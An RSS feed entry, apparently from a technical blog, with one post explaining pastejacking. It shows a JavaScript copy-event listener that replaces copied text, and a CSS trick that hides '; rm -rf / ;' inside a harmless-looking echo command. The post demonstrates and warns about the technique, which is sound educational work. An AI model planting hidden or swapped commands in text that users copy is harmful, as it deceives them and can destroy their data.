<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title></title>
    <description>For everything technical and interesting</description>
    <link>/savvy/</link>
    <atom:link href="/savvy/feed.xml" rel="self" type="application/rss+xml"/>
    <pubDate>Sat, 29 May 2021 14:23:48 +0530</pubDate>
    <lastBuildDate>Sat, 29 May 2021 14:23:48 +0530</lastBuildDate>
    <generator>Jekyll v4.2.0</generator>
    
      <item>
        <title>on Copy Paste</title>
        <description>&lt;p&gt;Javascript is extremely powerful, to say the least. One of its often overlooked features is the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;copy&lt;/code&gt; event listener.&lt;/p&gt;

&lt;p&gt;What damage can that do? Here, copy this ‘innocent’ command and paste it somewhere else.&lt;/p&gt;

&lt;p id=&quot;fakecopy&quot;&gt;&lt;code&gt;$ echo &quot;innocent text&quot;&lt;/code&gt;&lt;/p&gt;

&lt;script&gt;
 document.getElementById('fakecopy').addEventListener('copy', function(e) {
    e.clipboardData.setData('text/plain',
        'echo &quot;This could\'ve be something malicious!😈&quot;\n');
    e.preventDefault();
});
&lt;/script&gt;

&lt;p&gt;The text you just copied even has an &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Enter&lt;/code&gt; character so the command will execute automatically and I will have control over this system before you can comprehend what just went down.&lt;/p&gt;

&lt;p&gt;This is how the code works,&lt;/p&gt;

&lt;div class=&quot;language-javascript highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;document&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;getElementById&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;fakecopy&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;addEventListener&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;copy&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;function&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;clipboardData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;setData&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;text/plain&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
        &lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;echo &quot;This could&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;ve be something malicious!😈&quot;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;dl&quot;&gt;'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;nx&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;preventDefault&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;();&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;});&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Think you’ll be safe if you disable your javascript? Sorry to burst your bubble but this can also be done with raw &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CSS&lt;/code&gt;.&lt;/p&gt;

&lt;p id=&quot;fakecopy&quot;&gt; &lt;code&gt;$ echo &lt;span style=&quot;font-size: 0;&quot;&gt;; rm -rf / ; echo &lt;/span&gt;&quot;looks safe to me!&quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This is how that works,&lt;/p&gt;

&lt;div class=&quot;language-css highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;span&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&quot;font-size: 0&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;'malicious command'&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;span&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&quot;looks safe to me!&quot;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
</description>
        <pubDate>Fri, 29 May 2020 17:00:00 +0530</pubDate>
        <link>/savvy/hacking/2020/05/29/on-Copy-Paste.html</link>
        <guid isPermaLink="true">/savvy/hacking/2020/05/29/on-Copy-Paste.html</guid>
        
        
        <category>Hacking</category>
        
      </item>
    
  </channel>
</rss>
